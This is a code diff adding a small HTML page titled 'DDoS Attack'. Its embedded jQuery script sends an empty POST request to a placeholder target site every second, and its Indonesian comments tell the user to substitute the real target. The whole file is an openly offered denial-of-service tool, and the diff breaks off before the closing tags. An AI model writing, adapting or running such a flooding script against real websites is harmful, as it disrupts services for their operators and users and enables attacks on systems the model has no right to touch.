@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DDoS Attack</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>$(document).ready(function() {
+            setInterval(function() {
+                $.ajax({                   url:"http://target-website.com", // Ganti dengan website target
+                    type: "POST",                   data: "", // Kosongkan data
+                    success: function(response) {                   console.log("Request sent successfully");}   });},1000); // Mengirim permintaan setiap 1 detik
+        })
